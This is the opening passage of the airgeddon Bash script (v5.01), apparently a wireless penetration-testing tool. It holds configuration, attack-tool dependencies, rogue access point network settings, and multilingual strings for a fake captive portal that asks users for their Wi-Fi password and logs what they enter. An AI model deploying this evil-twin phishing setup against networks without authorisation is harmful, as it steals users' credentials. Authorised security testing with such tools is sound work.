#!/bin/bash

airgeddon_version="5.01"

#Enabled 1 / Disabled 0 - Debug mode for faster development skipping intro and initial checks - Default value 0
debug_mode=0

#Enabled 1 / Disabled 0 - Auto update feature (it has no effect on debug mode) - Default value 1
auto_update=1

#Enabled 1 / Disabled 0 - Auto change language feature - Default value 1
auto_change_language=1

#Language vars
#Change this line to select another default language. Select one from available values in array
language="ENGLISH"
declare -A lang_association=(
								["en"]="ENGLISH"
								["es"]="SPANISH"
								["fr"]="FRENCH"
								["ca"]="CATALAN"
								["pt"]="PORTUGUESE"
								["ru"]="RUSSIAN"
								["gr"]="GREEK"
							)

#Repository and contact vars
github_user="v1s1t0r1sh3r3"
github_repository="airgeddon"
branch="master"
script_filename="airgeddon.sh"
urlgithub="https://github.com/${github_user}/${github_repository}"
urlscript_directlink="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${script_filename}"
host_to_check_internet="github.com"
mail="v1s1t0r.1s.h3r3@gmail.com"
author="v1s1t0r"

#Tools vars
essential_tools_names=(
						"iwconfig"
						"iw"
						"awk"
						"airmon-ng"
						"airodump-ng"
						"aircrack-ng"
						"xterm"
					)

optional_tools_names=(
						"wpaclean"
						"crunch"
						"aireplay-ng"
						"mdk3"
						"hashcat"
						"hostapd"
						"dhcpd"
						"iptables"
						"ettercap"
						"etterlog"
						"sslstrip"
						"lighttpd"
						"dnsspoof"
						"wash"
						"reaver"
						"bully"
						"pixiewps"
					)

declare -A optional_tools=()

#Initialize optional_tools values
for item in "${optional_tools_names[@]}"; do
	optional_tools[${item}]=0
done

update_tools=("curl")

declare -A possible_package_names=(
									[${essential_tools_names[0]}]="wireless-tools" #iwconfig
									[${essential_tools_names[1]}]="iw" #iw
									[${essential_tools_names[2]}]="awk" #awk
									[${essential_tools_names[3]}]="aircrack-ng" #airmon-ng
									[${essential_tools_names[4]}]="aircrack-ng" #airodump-ng
									[${essential_tools_names[5]}]="aircrack-ng" #aircrack-ng
									[${essential_tools_names[6]}]="xterm" #xterm
									[${optional_tools_names[0]}]="aircrack-ng" #wpaclean
									[${optional_tools_names[1]}]="crunch" #crunch
									[${optional_tools_names[2]}]="aircrack-ng" #aireplay-ng
									[${optional_tools_names[3]}]="mdk3" #mdk3
									[${optional_tools_names[4]}]="hashcat" #hashcat
									[${optional_tools_names[5]}]="hostapd" #hostapd
									[${optional_tools_names[6]}]="isc-dhcp-server / dhcp-server / dhcp" #dhcpd
									[${optional_tools_names[7]}]="iptables" #iptables
									[${optional_tools_names[8]}]="ettercap / ettercap-text-only / ettercap-graphical" #ettercap
									[${optional_tools_names[9]}]="ettercap / ettercap-text-only / ettercap-graphical" #etterlog
									[${optional_tools_names[10]}]="sslstrip" #sslstrip
									[${optional_tools_names[11]}]="lighttpd" #lighttpd
									[${optional_tools_names[12]}]="dsniff" #dnsspoof
									[${optional_tools_names[13]}]="reaver" #wash
									[${optional_tools_names[14]}]="reaver" #reaver
									[${optional_tools_names[15]}]="bully" #bully
									[${optional_tools_names[16]}]="pixiewps" #pixiewps
									[${update_tools[0]}]="curl" #curl
								)

#General vars
standardhandshake_filename="handshake-01.cap"
tmpdir="/tmp/"
osversionfile_dir="/etc/"
minimum_bash_version_required="4.0"
minimum_reaver_pixiewps_version="1.5.2"
minimum_reaver_wash_large_version="1.5.2"
minimum_bully_pixiewps_version="1.1"
minimum_bully_verbosity4_version="1.1"
hashcat3_version="3.0"
resume_message=224
abort_question=12
pending_of_translation="[PoT]"
escaped_pending_of_translation="\[PoT\]"
standard_resolution="1024x768"

#Dhcpd, Hostapd and misc Evil Twin vars
ip_range="192.168.1.0"
alt_ip_range="172.16.250.0"
router_ip="192.168.1.1"
alt_router_ip="172.16.250.1"
broadcast_ip="192.168.1.255"
alt_broadcast_ip="172.16.250.255"
range_start="192.168.1.33"
range_stop="192.168.1.100"
alt_range_start="172.16.250.33"
alt_range_stop="172.16.250.100"
std_c_mask="255.255.255.0"
ip_mask="255.255.255.255"
dhcpd_file="ag.dhcpd.conf"
internet_dns1="8.8.8.8"
internet_dns2="8.8.4.4"
sslstrip_port="10000"
sslstrip_file="ag.sslstrip.log"
ettercap_file="ag.ettercaplog"
hostapd_file="ag.hostapd.conf"
control_file="ag.control.sh"
webserver_file="ag.lighttpd.conf"
webdir="www/"
indexfile="index.htm"
checkfile="check.htm"
cssfile="portal.css"
jsfile="portal.js"
attemptsfile="ag.et_attempts.txt"
currentpassfile="ag.et_currentpass.txt"
successfile="ag.et_success.txt"
processesfile="ag.et_processes.txt"
possible_dhcp_leases_files=(
							"/var/lib/dhcp/dhcpd.leases"
							"/var/state/dhcp/dhcpd.leases"
							"/var/lib/dhcpd/dhcpd.leases"
						)

#Distros vars
known_compatible_distros=(
							"Wifislax"
							"Kali"
							"Kali arm"
							"Parrot"
							"Parrot arm"
							"Backbox"
							"Blackarch"
							"Cyborg"
							"Ubuntu"
							"Raspbian"
							"Debian"
							"SuSE"
							"CentOS"
							"Gentoo"
							"Fedora"
							"Red Hat"
							"Arch"
							"OpenMandriva"
						)

#Hint vars
declare main_hints=(128 134 163)
declare dos_hints=(129 131 133)
declare handshake_hints=(127 130 132 136)
declare handshake_attack_hints=(142)
declare decrypt_hints=(171 178 179 208 244)
declare select_interface_hints=(246)
declare language_hints=(250)
declare evil_twin_hints=(254 258 264 269 309 328)
declare evil_twin_dos_hints=(267 268)
declare wps_hints=(342 343 344 356 369)

#Charset vars
crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
crunch_uppercasecharset="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
crunch_numbercharset="0123456789"
crunch_symbolcharset="!#$%/=?{}[]-*:;"
hashcat_charsets=("?l" "?u" "?d" "?s")

#Colors vars
green_color="\033[1;32m"
red_color="\033[1;31m"
red_color_slim="\033[0;031m"
blue_color="\033[1;34m"
cyan_color="\033[1;36m"
brown_color="\033[0;33m"
yellow_color="\033[1;33m"
pink_color="\033[1;35m"
normal_color="\e[1;0m"

#Set different language text strings
function language_strings() {

	declare -A unknown_chipset
	unknown_chipset["ENGLISH"]="Unknown"
	unknown_chipset["SPANISH"]="Desconocido"
	unknown_chipset["FRENCH"]="Inconnu"
	unknown_chipset["CATALAN"]="Desconegut"
	unknown_chipset["PORTUGUESE"]="Desconhecido"
	unknown_chipset["RUSSIAN"]="Неизвестно"
	unknown_chipset["GREEK"]="Άγνωστο"
	unknown_chipsetvar="${unknown_chipset[${language}]}"

	declare -A hintprefix
	hintprefix["ENGLISH"]="Hint"
	hintprefix["SPANISH"]="Consejo"
	hintprefix["FRENCH"]="Conseil"
	hintprefix["CATALAN"]="Consell"
	hintprefix["PORTUGUESE"]="Conselho"
	hintprefix["RUSSIAN"]="Подсказка"
	hintprefix["GREEK"]="Συμβουλή"
	hintvar="*${hintprefix[${language}]}*"
	escaped_hintvar="\*${hintprefix[${language}]}\*"

	declare -A optionaltool_needed
	optionaltool_needed["ENGLISH"]="Locked option, it needs: "
	optionaltool_needed["SPANISH"]="Opción bloqueada, requiere: "
	optionaltool_needed["FRENCH"]="Option bloquée parce qu’il manque: "
	optionaltool_needed["CATALAN"]="Opció bloquejada, necessita: "
	optionaltool_needed["PORTUGUESE"]="Opção bloqueado requer: "
	optionaltool_needed["RUSSIAN"]="Опция заблокирована, требуется: "
	optionaltool_needed["GREEK"]="Κλειδωμένη επιλογή, χρειάζεται: "

	declare -A under_construction
	under_construction["ENGLISH"]="under construction"
	under_construction["SPANISH"]="en construcción"
	under_construction["FRENCH"]="en construction"
	under_construction["CATALAN"]="en construcció"
	under_construction["PORTUGUESE"]="em construção"
	under_construction["RUSSIAN"]="на ремонте"
	under_construction["GREEK"]="υπό κατασκευή"
	under_constructionvar="${under_construction[${language}]}"

	declare -gA possible_package_names
	possible_package_names["ENGLISH"]="Possible package name"
	possible_package_names["SPANISH"]="Posible nombre del paquete"
	possible_package_names["FRENCH"]="Possible nom du paquet"
	possible_package_names["CATALAN"]="Possible nom del paquet"
	possible_package_names["PORTUGUESE"]="Possível nome do pacote"
	possible_package_names["RUSSIAN"]="Возможное имя пакета"
	possible_package_names["GREEK"]="Πιθανό όνομα πακέτου"

	declare -gA et_misc_texts
	et_misc_texts["ENGLISH",0]="Evil Twin AP Info"
	et_misc_texts["SPANISH",0]="Info Evil Twin AP"
	et_misc_texts["FRENCH",0]="Info Evil Twin AP"
	et_misc_texts["CATALAN",0]="Info Evil Twin AP"
	et_misc_texts["PORTUGUESE",0]="Info Evil Twin AP"
	et_misc_texts["RUSSIAN",0]="Информация о Злом Двойнике ТД"
	et_misc_texts["GREEK",0]="Πληροφορίες Evil Twin AP"

	et_misc_texts["ENGLISH",1]="Channel"
	et_misc_texts["SPANISH",1]="Canal"
	et_misc_texts["FRENCH",1]="Canal"
	et_misc_texts["CATALAN",1]="Canal"
	et_misc_texts["PORTUGUESE",1]="Canal"
	et_misc_texts["RUSSIAN",1]="Канал"
	et_misc_texts["GREEK",1]="Κανάλι"

	et_misc_texts["ENGLISH",2]="Online time"
	et_misc_texts["SPANISH",2]="Tiempo online"
	et_misc_texts["FRENCH",2]="Temps en ligne"
	et_misc_texts["CATALAN",2]="Temps online"
	et_misc_texts["PORTUGUESE",2]="Tempo online"
	et_misc_texts["RUSSIAN",2]="Время онлайн"
	et_misc_texts["GREEK",2]="Χρόνος σε σύνδεση"

	et_misc_texts["ENGLISH",3]="DHCP ips given to possible connected clients"
	et_misc_texts["SPANISH",3]="Ips entregadas por DHCP a posibles clientes conectados"
	et_misc_texts["FRENCH",3]="Ips attribuées à d'éventuels clients DHCP"
	et_misc_texts["CATALAN",3]="Ips lliurades per DHCP a possibles clients connectats"
	et_misc_texts["PORTUGUESE",3]="Ips entregues pelo DHCP aos possiveis clientes conectados "
	et_misc_texts["RUSSIAN",3]="IP, которые DHCP будет давать возможным подключённым клиентам"
	et_misc_texts["GREEK",3]="DHCP IP διευθύνσεις που έχουν δωθεί σε πιθανούς συνδεδεμένους χρήστες"

	et_misc_texts["ENGLISH",4]="With this attack you have to use an external sniffer to try to obtain client passwords connected to the network"
	et_misc_texts["SPANISH",4]="Con este ataque has de usar un sniffer externo para intentar obtener contraseñas de los clientes conectados a la red"
	et_misc_texts["FRENCH",4]="Avec cette attaque, vous devez utiliser un sniffeur pour tenter d'obtenir les mots de passe des clients connectés au réseau"
	et_misc_texts["CATALAN",4]="Amb aquest atac has d'utilitzar un sniffer extern per intentar obtenir contrasenyes dels clients connectats a la xarxa"
	et_misc_texts["PORTUGUESE",4]="Com este ataque você tem que usar um sniffer externa para tentar obter as senhas dos clientes conectados à rede"
	et_misc_texts["RUSSIAN",4]="С этой атакой вам нужно использовать внешний сниффер для попытки получить пароли клиентов, подключённых к сети"
	et_misc_texts["GREEK",4]="Με αυτή την επίθεση θα πρέπει να χρησιμοποιήσετε έναν εξωτερικό sniffer για να μπορέσετε να υποκλέψετε κωδικούς πρόσβασης από τους χρήστες που είναι συνδεδεμένοι στο δίκτυο"

	et_misc_texts["ENGLISH",5]="With this attack, watch the sniffer's screen to see if a password appears"
	et_misc_texts["SPANISH",5]="Con este ataque, estate atento a la pantalla del sniffer para ver si aparece alguna contraseña"
	et_misc_texts["FRENCH",5]="Vérifiez pendant l'attaque dans la console du sniffeur si un mot de passe a été capturé"
	et_misc_texts["CATALAN",5]="Amb aquest atac, estigues atent a la pantalla de l'sniffer per veure si apareix alguna contrasenya"
	et_misc_texts["PORTUGUESE",5]="Com este ataque, fique atento na tela do sniffer para ver se aparece alguma senha"
	et_misc_texts["RUSSIAN",5]="С этой атакой смотрите на окно сниффера, чтобы следить за появлением пароля"
	et_misc_texts["GREEK",5]="Με αυτή την επίθεση, παρακολουθήστε την οθόνη του sniffer για να δείτε αν εχει εμφανιστεί κάποιος κωδικός πρόσβασης"

	et_misc_texts["ENGLISH",6]="With this attack, we'll wait for a network client to provide us with the password for the wifi network in our captive portal"
	et_misc_texts["SPANISH",6]="Con este ataque, esperaremos a que un cliente de la red nos provea de la contraseña de la red wifi en nuestro portal cautivo"
	et_misc_texts["FRENCH",6]="Avec cette attaque nous allons attendre qu'un client rentre le mot de passe du réseau cible dans notre portail captif"
	et_misc_texts["CATALAN",6]="Amb aquest atac, esperarem que un client de la xarxa ens proveeixi de la contrasenya de la xarxa wifi al nostre portal captiu"
	et_misc_texts["PORTUGUESE",6]="Com este ataque, vamos esperar que um cliente nos forneça a senha da rede wifi em nosso portal cativo"
	et_misc_texts["RUSSIAN",6]="С этой атакой вы будете ожидать, чтобы сетевые клиенты ввели пароль для wifi сети на нашем перехватывающем портале"
	et_misc_texts["GREEK",6]="Με αυτή την επίθεση, θα περιμένουμε για έναν χρήστη του δικτύου να μας παρέχει με τον κωδικό πρόσβασης του wifi στο captive portal μας"

	et_misc_texts["ENGLISH",7]="No clients connected yet"
	et_misc_texts["SPANISH",7]="No hay clientes conectados aún"
	et_misc_texts["FRENCH",7]="Toujours pas de clients connectés"
	et_misc_texts["CATALAN",7]="Encara no hi han clients connectats"
	et_misc_texts["PORTUGUESE",7]="Ainda não há clientes conectados"
	et_misc_texts["RUSSIAN",7]="Клиенты ещё не подключены"
	et_misc_texts["GREEK",7]="Ακόμα, κανένας συνδεδεμένος χρήστης"

	et_misc_texts["ENGLISH",8]="Airgeddon. Evil Twin attack captured passwords"
	et_misc_texts["SPANISH",8]="Airgeddon. Contraseñas capturadas en ataque Evil Twin"
	et_misc_texts["FRENCH",8]="Airgeddon. Mots de passe capturés par attaque Evil Twin"
	et_misc_texts["CATALAN",8]="Airgeddon. Contrasenyes capturades amb atac Evil Twin"
	et_misc_texts["PORTUGUESE",8]="Airgeddon. Senhas capturado no ataque ataque Evil Twin"
	et_misc_texts["RUSSIAN",8]="Airgeddon. Атака Злой Двойник захватила пароли"
	et_misc_texts["GREEK",8]="Airgeddon. Η επίθεση Evil Twin κατέγραψε κωδικούς πρόσβασης"

	et_misc_texts["ENGLISH",9]="Wireless network, ESSID:"
	et_misc_texts["SPANISH",9]="Red inalámbrica, ESSID:"
	et_misc_texts["FRENCH",9]="Réseau sans fil, ESSID:"
	et_misc_texts["CATALAN",9]="Xarxa sense fils, ESSID:"
	et_misc_texts["PORTUGUESE",9]="ESSID da rede sem fio:"
	et_misc_texts["RUSSIAN",9]="Беспроводная сеть, ESSID:"
	et_misc_texts["GREEK",9]="Ασύρματο Δίκτυο, ESSID:"

	et_misc_texts["ENGLISH",10]="Enter your wireless network password to get internet access"
	et_misc_texts["SPANISH",10]="Introduzca su contraseña de acceso a la red inalámbrica para poder acceder a internet"
	et_misc_texts["FRENCH",10]="Veuillez saisir la clé de sécurité du réseau wifi pour obtenir accès à internet"
	et_misc_texts["CATALAN",10]="Introduïu la contrasenya d&#39;accés a la xarxa sense fils per poder accedir a internet"
	et_misc_texts["PORTUGUESE",10]="Digite a senha da rede wifi para ter acesso a internet"
	et_misc_texts["RUSSIAN",10]="Введите пароль Вашей беспроводной сети для подключения к Интернету"
	et_misc_texts["GREEK",10]="Εισάγετε τον κωδικό πρόσβασης του wifi δικτύου σας για να υπάρξει σύνδεση στο διαδίκτυο"

	et_misc_texts["ENGLISH",11]="Password"
	et_misc_texts["SPANISH",11]="Contraseña"
	et_misc_texts["FRENCH",11]="Clé de sécurité"
	et_misc_texts["CATALAN",11]="Contrasenya"
	et_misc_texts["PORTUGUESE",11]="Senha"
	et_misc_texts["RUSSIAN",11]="Пароль"
	et_misc_texts["GREEK",11]="Κωδικός πρόσβασης"

	et_misc_texts["ENGLISH",12]="Show password"
	et_misc_texts["SPANISH",12]="Mostrar contraseña"
	et_misc_texts["FRENCH",12]="Afficher les caractères"
	et_misc_texts["CATALAN",12]="Mostra la contrasenya"
	et_misc_texts["PORTUGUESE",12]="Mostrar senha"
	et_misc_texts["RUSSIAN",12]="Показать пароль"
	et_misc_texts["GREEK",12]="Εμφάνιση κωδικού πρόσβασης"

	et_misc_texts["ENGLISH",13]="Submit"
	et_misc_texts["SPANISH",13]="Enviar"
	et_misc_texts["FRENCH",13]="Enregistrer"
	et_misc_texts["CATALAN",13]="Enviar"
	et_misc_texts["PORTUGUESE",13]="Enviar"
	et_misc_texts["RUSSIAN",13]="Отправить"
	et_misc_texts["GREEK",13]="Υποβολή"

	et_misc_texts["ENGLISH",14]="An unexpected error occurred, redirecting to the main screen"
	et_misc_texts["SPANISH",14]="Ha ocurrido un error inesperado, redirigiendo a la pantalla principal"
	et_misc_texts["FRENCH",14]="Une erreur inattendue s&#39;est produite, retour à l&#39;écran principal"
	et_misc_texts["CATALAN",14]="Hi ha hagut un error inesperat, redirigint a la pantalla principal"
	et_misc_texts["PORTUGUESE",14]="Ocorreu um erro inesperado, redirecionando para a pagina principal"
	et_misc_texts["RUSSIAN",14]="Непредвиденная ошибка, перенаправление на главную страницу"
	et_misc_texts["GREEK",14]="Παρουσιάστηκε μη αναμενόμενο σφάλμα, Θα καθοδηγηθείτε στην κύρια οθόνη"

	et_misc_texts["ENGLISH",15]="Internet Portal"
	et_misc_texts["SPANISH",15]="Portal de Internet"
	et_misc_texts["FRENCH",15]="Portail Internet"
	et_misc_texts["CATALAN",15]="Portal d&#39;Internet"
	et_misc_texts["PORTUGUESE",15]="Portal Internet"
	et_misc_texts["RUSSIAN",15]="Интернет-портал"
	et_misc_texts["GREEK",15]="Internet Portal"

	et_misc_texts["ENGLISH",16]="The password must be at least 8 characters"
	et_misc_texts["SPANISH",16]="La contraseña debe tener al menos 8 caracteres"
	et_misc_texts["FRENCH",16]="La clé de sécurité doit contenir au moins 8 caractères"
	et_misc_texts["CATALAN",16]="La contrasenya ha de tenir almenys 8 caràcters"
	et_misc_texts["PORTUGUESE",16]="A senha deve ter no mínimo 8 caracteres"
	et_misc_texts["RUSSIAN",16]="Длина пароля должна быть не менее 8 символов"
	et_misc_texts["GREEK",16]="Ο κωδικός πρόσβασης πρέπει να αποτελείται από τουλάχιστον 8 χαρακτήρες"

	et_misc_texts["ENGLISH",17]="The password is incorrect, redirecting to the main screen"
	et_misc_texts["SPANISH",17]="La contraseña introducida es incorrecta, redirigiendo a la pantalla principal"
	et_misc_texts["FRENCH",17]="Clé de sécurité incorrecte, retour à l&#39;écran principal"
	et_misc_texts["CATALAN",17]="La contrasenya introduïda és incorrecta, redirigint a la pantalla principal"
	et_misc_texts["PORTUGUESE",17]="A senha está incorreta, redirecionando para a pagina principal"
	et_misc_texts["RUSSIAN",17]="Неправильный пароль, возврат на главную страницу"
	et_misc_texts["GREEK",17]="Ο κωδικός πρόσβασης είναι λανθασμένος, Θα καθοδηγηθείτε στην κύρια οθόνη"

	et_misc_texts["ENGLISH",18]="The password is correct, the connection will be restablished in a few moments"
	et_misc_texts["SPANISH",18]="La contraseña es correcta, la conexión se restablecerá en unos momentos"
	et_misc_texts["FRENCH",18]="Clé de sécurité correcte, la connexion sera établie dans quelques instants"
	et_misc_texts["CATALAN",18]="La contrasenya és correcta, la connexió es restablirà en uns moments"
	et_misc_texts["PORTUGUESE",18]="A senha está correta, a conexão será estabelecida em alguns momentos"
	et_misc_texts["RUSSIAN",18]="Пароль верен, подключение устанавливается"
	et_misc_texts["GREEK",18]="Ο κωδικός πρόσβασης είναι σωστός, η σύνδεση θα αποκατασταθεί σε λίγα λεπτά"

	et_misc_texts["ENGLISH",19]="Airgeddon. Captive portal Evil Twin attack captured password"
	et_misc_texts["SPANISH",19]="Airgeddon. Contraseña capturada en el portal cautivo del ataque Evil Twin"
	et_misc_texts["FRENCH",19]="Airgeddon. Mot de passe capturé par le portail captif de l'attaque Evil Twin"
	et_misc_texts["CATALAN",19]="Airgeddon. Contrasenya capturada al portal captiu de l'atac Evil Twin"
	et_misc_texts["PORTUGUESE",19]="Airgeddon. Senha capturada no ataque Evil Twin portal cativo"
	et_misc_texts["RUSSIAN",19]="Airgeddon. Пароль, захваченный атакой Злой Двойник и Перехватывающим порталом"
	et_misc_texts["GREEK",19]="Airgeddon. Η επίθεση Evil Twin με captive portal κατέγραψε τον κωδικό πρόσβασης"

	et_misc_texts["ENGLISH",20]="Attempts"
	et_misc_texts["SPANISH",20]="Intentos"
	et_misc_texts["FRENCH",20]="Essais"
	et_misc_texts["CATALAN",20]="Intents"
	et_misc_texts["PORTUGUESE",20]="Tentativas"
	et_misc_texts["RUSSIAN",20]="Попытки"
	et_misc_texts["GREEK",20]="Προσπάθειες"

	et_misc_texts["ENGLISH",21]="last password:"
	et_misc_texts["SPANISH",21]="última contraseña:"
	et_misc_texts["FRENCH",21]="dernier mot de passe:"
	et_misc_texts["CATALAN",21]="última contrasenya:"
	et_misc_texts["PORTUGUESE",21]="última senha:"
	et_misc_texts["RUSSIAN",21]="последний пароль:"
	et_misc_texts["GREEK",21]="τελευταίος κωδικός πρόσβασης:"

	et_misc_texts["ENGLISH",22]="Captured passwords on failed attemps"
	et_misc_texts["SPANISH",22]="Contraseñas capturadas en intentos fallidos"
	et_misc_texts["FRENCH",22]="Mots de passe capturés lors des tentatives infructueuses"
	et_misc_texts["CATALAN",22]="Contrasenyes capturades en intents fallits"
	et_misc_texts["PORTUGUESE",22]="Senhas erradas capturadas durante as tentativas"
	et_misc_texts["RUSSIAN",22]="Пароли, захваченные в неудачных попытках"
	et_misc_texts["GREEK",22]="Καταγεγραμμένοι κωδικοί πρόσβασης σε αποτυχημένες προσπάθειες"

	et_misc_texts["ENGLISH",23]="Password captured successfully"
	et_misc_texts["SPANISH",23]="Contraseña capturada con éxito"
	et_misc_texts["FRENCH",23]="Mot de passe capturé avec succès"
	et_misc_texts["CATALAN",23]="Contrasenya capturada amb èxit"
	et_misc_texts["PORTUGUESE",23]="Senha capturada com sucesso"
	et_misc_texts["RUSSIAN",23]="Пароль успешно захвачен"
	et_misc_texts["GREEK",23]="Ο κωδικός πρόσβασης καταγράφτηκε επιτυχώς"

	et_misc_texts["ENGLISH",24]="The password was saved on file"
	et_misc_texts["SPANISH",24]="La contraseña se ha guardado en el fichero"
	et_misc_texts["FRENCH",24]="Le mot de passe est enregistré dans le fichier"
	et_misc_texts["CATALAN",24]="La contrasenya s'ha guardat en el fitxer"
	et_misc_texts["PORTUGUESE",24]="A senha foi salva no arquivo"
	et_misc_texts["RUSSIAN",24]="Пароль был сохранён в файле"
	et_misc_texts["GREEK",24]="Ο κωδικός πρόσβασης αποθηκεύτηκε σε αρχείο"

	et_misc_texts["ENGLISH",25]="Press [Enter] on the main script window to continue, this window will be closed"
	et_misc_texts["SPANISH",25]="Pulsa [Enter] en la ventana principal del script para continuar, esta ventana se cerrará"
	et_misc_texts["FRENCH",25]="Appuyez sur [Entrée] dans la fenêtre principale du script pour continuer, cette fenêtre se fermera"
	et_misc_texts["CATALAN",25]="Prem [Enter] a la finestra principal del script per continuar, aquesta finestra es tancarà"
	et_misc_texts["PORTUGUESE",25]="Pressione [Enter] na janela principal do script para continuar e esta janela será fechada"
	et_misc_texts["RUSSIAN",25]="Нажмите [Enter] в главном окне для продолжения, это окно будет закрыто"
	et_misc_texts["GREEK",25]="Πατήστε [Enter] στο κύριο παράθυρο του script για να συνεχίσετε, το παράθυρο αυτό θα κλείσει"

	et_misc_texts["ENGLISH",26]="Error. The password must be at least 8 characters. Redirecting to the main screen"
	et_misc_texts["SPANISH",26]="Error. La contraseña debe tener al menos 8 caracteres. Redirigiendo a la pantalla principal"
	et_misc_texts["FRENCH",26]="Erreur. La clé de sécurité doit contenir au moins 8 caractères. Retour à l&#39;écran principal"
	et_misc_texts["CATALAN",26]="Error. La contrasenya ha de tenir almenys 8 caràcters. Redirigint a la pantalla principal"
	et_misc_texts["PORTUGUESE",26]="Erro. A senha deve ter no mínimo 8 caracteres. Redirecionando para a pagina principal"
	et_misc_texts["RUSSIAN",26]="Ошибка. В пароле должно быть не менее 8 символов. Перенаправление на главную страницу"
	et_misc_texts["GREEK",26]="Σφάλμα. Ο κωδικός πρόσβασης πρέπει να αποτελείται από τουλάχιστον 8 χαρακτήρες. Θα καθοδηγηθείτε στην κύρια οθόνη"

	declare -A arr
	arr["ENGLISH",0]="This interface ${interface} is already in managed mode"
	arr["SPANISH",0]="Esta interfaz ${interface} ya está en modo managed"
	arr["FRENCH",0]="L'interface ${interface} est déjà en mode managed"
	arr["CATALAN",0]="Aquesta interfície ${interface} ja està en mode managed"
	arr["PORTUGUESE",0]="Esta interface ${interface} já está em modo managed"
	arr["RUSSIAN",0]="Этот интерфейс ${interface} уже в управляемом режиме"
	arr["GREEK",0]="Αυτή η διεπαφή ${interface} είναι ήδη σε ετερόκλητη κατάσταση"

	arr["ENGLISH",1]="This interface ${interface} is not a wifi card. It doesn't support managed mode"
	arr["SPANISH",1]="Esta interfaz ${interface} no es una tarjeta wifi. No soporta modo managed"
	arr["FRENCH",1]="L'interface ${interface} n'est pas une carte wifi. Elle n'est donc pas compatible mode managed"
	arr["CATALAN",1]="Aquesta interfície ${interface} no és una targeta wifi vàlida. No es compatible amb mode managed"
	arr["PORTUGUESE",1]="Esta interface ${interface} não é wifi. Ela não suporta o modo managed"
	arr["RUSSIAN",1]="Этот интерфейс ${interface} не является wifi картой. Он не поддерживает управляемый режим"
	arr["GREEK",1]="Αυτή η διεπαφή ${interface} δεν είναι κάρτα wifi. Δεν υποστηρίζει ετερόκλητη κατάσταση."

	arr["ENGLISH",2]="English O.S. language detected. Supported by script. Automatically changed"
	arr["SPANISH",2]="Idioma Español del S.O. detectado. Soportado por el script. Se cambió automaticamente"
	arr["FRENCH",2]="S.E. en Français détecté. Langue prise en charge par le script et changé automatiquement"
	arr["CATALAN",2]="Idioma Català del S.O. detectat. Suportat pel script. S'ha canviat automàticament"
	arr["PORTUGUESE",2]="S.O. em Portugues detectado. Compatível com o script. Linguagem automaticamente alterada"
	arr["RUSSIAN",2]="Определена ОС на русском. Поддерживается скриптом. Автоматически изменена. Помощь на русском: https://hackware.ru/?p=670"
	arr["GREEK",2]="Εντοπίστηκε Ελληνική γλώσσα συστήματος. Υποστηρίξιμη από το script. Άλλαξε αυτόματα"

	arr["ENGLISH",3]="Select target network :"
	arr["SPANISH",3]="Selecciona la red objetivo :"
	arr["FRENCH",3]="Sélectionnez le réseau cible :"
	arr["CATALAN",3]="Selecciona la xarxa objectiu :"
	arr["PORTUGUESE",3]="Selecione uma rede com objetivo :"
	arr["RUSSIAN",3]="Выбор целевой сети :"
	arr["GREEK",3]="Διαλέξτε δίκτυο :"

	arr["ENGLISH",4]="Press [Enter] key to start attack..."
	arr["SPANISH",4]="Pulse la tecla [Enter] para comenzar el ataque..."
	arr["FRENCH",4]="Pressez [Enter] pour commencer l'attaque..."
	arr["CATALAN",4]="Premi la tecla [Enter] per començar l'atac..."
	arr["PORTUGUESE",4]="Pressione [Enter] para iniciar o ataque..."
	arr["RUSSIAN",4]="Нажмите клавишу [Enter] для начала атаки..."
	arr["GREEK",4]="Πατήστε [Enter] για να ξεκινήσει η επίθεση..."

	arr["ENGLISH",5]="It looks like your internet connection is unstable. The script can't connect to repository. It will continue without updating..."
	arr["SPANISH",5]="Parece que tu conexión a internet no es estable. El script no puede conectar al repositorio. Continuará sin actualizarse..."
	arr["FRENCH",5]="Votre connexion internet est trop médiocre pour pouvoir se connecter aux dépôts comme ils se doit. Le script va s’exécuter sans s'actualiser..."
	arr["CATALAN",5]="Sembla que la teva connexió a internet no és estable. El script no pot connectar amb el repositori. Continuarà sense actualitzar-se..."
	arr["PORTUGUESE",5]="Parece que sua conexão com a internet não é estável. O script não pode conectar-se ao repositório. Ele continuará sem atualizar..."
	arr["RUSSIAN",5]="Интернет-подключение кажется нестабильным. Скрипт не может подключиться к репозиторию. Он продолжит без обновления..."
	arr["GREEK",5]="Φαίνεται πως η σύνδεση με το διαδίκτυο δεν είναι σταθερή. Το script δεν μπορεί να συνδεθεί στο repository. Θα συνεχίσει χωρίς να έχει ενημερωθεί..."

	arr["ENGLISH",6]="Welcome to airgeddon script v${airgeddon_version}"
	arr["SPANISH",6]="Bienvenid@ a airgeddon script v${airgeddon_version}"
	arr["FRENCH",6]="Bienvenue au script airgeddon v${airgeddon_version}"
	arr["CATALAN",6]="Benvingut a airgeddon script v${airgeddon_version}"
	arr["PORTUGUESE",6]="Bem-vindo ao script airgeddon v${airgeddon_version}"
	arr["RUSSIAN",6]="Добро пожаловать в скрипт airgeddon v${airgeddon_version}"
	arr["GREEK",6]="Καλωσήρθατε στο airgeddon v${airgeddon_version}"

	arr["ENGLISH",7]="This script is only for educational purposes. Be good boyz&girlz!"
	arr["SPANISH",7]="Este script se ha hecho sólo con fines educativos. Sed buen@s chic@s!"
	arr["FRENCH",7]="Ce script a été fait à des fins purement éducatives. Portez-vous biens!"
	arr["CATALAN",7]="Aquest script s'ha fet només amb fins educatius. Porteu-vos bé!"
	arr["PORTUGUESE",7]="Este script foi feito apenas para fins educacionais. Comportem-se!"
	arr["RUSSIAN",7]="Этот скрипт только для образовательных целей. Будьте хорошими мальчиками и девочками!"
	arr["GREEK",7]="Αυτό το script είναι για διδακτικούς σκοπούς. Να είστε φρόνιμοι!"

	arr["ENGLISH",8]="Known compatible distros with this script :"
	arr["SPANISH",8]="Distros conocidas compatibles con este script :"
	arr["FRENCH",8]="Distros connus compatibles avec ce script :"
	arr["CATALAN",8]="Distros conegudes compatibles amb aquest script :"
	arr["PORTUGUESE",8]="Distros conhecidas compatíveis com este script :"
	arr["RUSSIAN",8]="Дистрибутивы о которых известно, что они совместимы со скриптом :"
	arr["GREEK",8]="Γνώστες εκδόσεις που υποστηρίζουν αυτό το script :"

	arr["ENGLISH",9]="Detecting system..."
	arr["SPANISH",9]="Detectando sistema..."
	arr["FRENCH",9]="Détection du système..."
	arr["CATALAN",9]="Detecció del sistema..."
	arr["PORTUGUESE",9]="Detectando sistema..."
	arr["RUSSIAN",9]="Определяем систему..."
